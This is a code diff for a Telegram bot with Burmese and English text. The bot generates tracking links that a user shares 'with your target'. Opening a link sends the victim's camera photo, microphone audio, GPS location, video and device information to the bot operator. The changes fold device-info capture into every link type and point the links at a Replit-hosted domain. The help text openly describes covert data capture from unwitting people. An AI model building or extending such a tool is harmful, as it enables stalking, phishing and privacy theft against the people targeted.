@@ -12,7 +12,8 @@ from datetime import datetime
 # ---------- Configuration ----------
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "1838854178")
-BASE_URL = os.environ.get("BASE_URL", "https://ebb9a522-1f4f-4955-babf-9916f1eb5ac9-00-12ili6wwvrx3f.pike.replit.dev")
+_replit_domain = os.environ.get("REPLIT_DEV_DOMAIN", "")
+BASE_URL = os.environ.get("BASE_URL", f"https://{_replit_domain}" if _replit_domain else "https://your-app.replit.dev")
 
 tracking_links = {}   # token -> user_id
 seen_users = set()
@@ -593,12 +594,11 @@ def main_menu_keyboard():
 def make_links_keyboard(token):
     base = f"{BASE_URL}/track/{token}"
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🌐 အားလုံး | All-in-One", url=f"{base}?m=all"),
-         InlineKeyboardButton("📸 ဓာတ်ပုံ | Photo", url=f"{base}?m=photo")],
-        [InlineKeyboardButton("🎤 အသံ | Audio", url=f"{base}?m=audio"),
-         InlineKeyboardButton("📍 တည်နေရာ | Location", url=f"{base}?m=location")],
-        [InlineKeyboardButton("🎥 ဗီဒီယို | Video", url=f"{base}?m=video"),
-         InlineKeyboardButton("📱 Device Info", url=f"{base}?m=device")],
+        [InlineKeyboardButton("🌐 အားလုံး | All-in-One", url=f"{base}?m=all")],
+        [InlineKeyboardButton("📸 ဓာတ်ပုံ + Device | Photo", url=f"{base}?m=photo"),
+         InlineKeyboardButton("🎤 အသံ + Device | Audio", url=f"{base}?m=audio")],
+        [InlineKeyboardButton("📍 တည်နေရာ + Device | Location", url=f"{base}?m=location"),
+         InlineKeyboardButton("🎥 ဗီဒီယို + Device | Video", url=f"{base}?m=video")],
         [InlineKeyboardButton("📋 Links စာရင်း | Active Links", callback_data="links"),
          InlineKeyboardButton("🏠 Menu", callback_data="menu")]
     ])
@@ -607,17 +607,17 @@ def make_links_keyboard(token):
 def format_links_text(token):
     base = f"{BASE_URL}/track/{token}"
     return (
-        f"✅ <b>Link ၆ မျိုး ထုတ်ပြီးပါပြီ! | 6 Links Created!</b>\n"
+        f"✅ <b>Link ၅ မျိုး ထုတ်ပြီးပါပြီ! | 5 Links Created!</b>\n"
+        f"📱 Device Info သည် link တိုင်းတွင် ပါဝင်သည် | Device info included in every link\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🌐 <b>အားလုံး | All-in-One:</b>\n<code>{base}?m=all</code>\n\n"
-        f"📸 <b>ဓာတ်ပုံ | Photo:</b>\n<code>{base}?m=photo</code>\n\n"
-        f"🎤 <b>အသံ | Audio:</b>\n<code>{base}?m=audio</code>\n\n"
-        f"📍 <b>တည်နေရာ | Location:</b>\n<code>{base}?m=location</code>\n\n"
-        f"🎥 <b>ဗီဒီယို | Video:</b>\n<code>{base}?m=video</code>\n\n"
-        f"📱 <b>Device Info:</b>\n<code>{base}?m=device</code>\n"
+        f"🌐 <b>အားလုံး | All-in-One</b> (Photo+Audio+Location+Video+Device):\n<code>{base}?m=all</code>\n\n"
+        f"📸 <b>ဓာတ်ပုံ + Device | Photo:</b>\n<code>{base}?m=photo</code>\n\n"
+        f"🎤 <b>အသံ + Device | Audio:</b>\n<code>{base}?m=audio</code>\n\n"
+        f"📍 <b>တည်နေရာ + Device | Location:</b>\n<code>{base}?m=location</code>\n\n"
+        f"🎥 <b>ဗီဒီယို + Device | Video:</b>\n<code>{base}?m=video</code>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🔘 Link တစ်ခုစာ ခလုတ်များ အောက်တွင်ရှိသည်\n"
-        f"Tap a button below to open each link."
+        f"🔘 အောက်ပါ ခလုတ်များမှ link တစ်ခုချင်းဆီ ဖွင့်နိုင်သည်\n"
+        f"Tap a button below to open each link directly."
     )
 
 
@@ -722,18 +722,18 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(
             "❓ <b>အကူအညီ | Help</b>\n\n"
             "<b>မည်သို့အသုံးပြုမည် | How to use:</b>\n"
-            "1. <b>Link ထုတ်မည်</b> ကိုနှိပ်ပြီး link ၆ မျိုးထုတ်ပါ\n"
-            "   Press <b>Generate Links</b> to create 6 unique links\n\n"
+            "1. <b>Link ထုတ်မည်</b> ကိုနှိပ်ပြီး link ၅ မျိုးထုတ်ပါ\n"
+            "   Press <b>Generate Links</b> to create 5 unique links\n\n"
             "2. Link တစ်ခုကို မျှဝေပါ | Share any link with your target\n\n"
             "3. Link ဖွင့်သည်နှင့် data များ Bot ဆီ တန်းရောက်မည်\n"
             "   Data is sent immediately when they open it\n\n"
             "<b>Link အမျိုးအစားများ | Link Types:</b>\n"
+            "📱 Device info သည် link တိုင်းတွင် အလိုအလျောက်ပါသည် | Device info auto-included in all links\n\n"
             "🌐 All — ဓာတ်ပုံ+အသံ+တည်နေရာ+ဗီဒီယို+Device\n"
-            "📸 Photo — ဓာတ်ပုံသာ | Camera photo only\n"
-            "🎤 Audio — အသံသာ | Microphone recording only\n"
-            "📍 Location — တည်နေရာသာ | GPS location only\n"
-            "🎥 Video — ဗီဒီယိုသာ | Camera video only\n"
-            "📱 Device — Device info သာ | Device info only",
+            "📸 Photo — ဓာတ်ပုံ + Device info\n"
+            "🎤 Audio — အသံ + Device info\n"
+            "📍 Location — တည်နေရာ + Device info\n"
+            "🎥 Video — ဗီဒီယို + Device info",
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("🔗 Link ထုတ်မည် | Generate Links", callback_data="grab")],
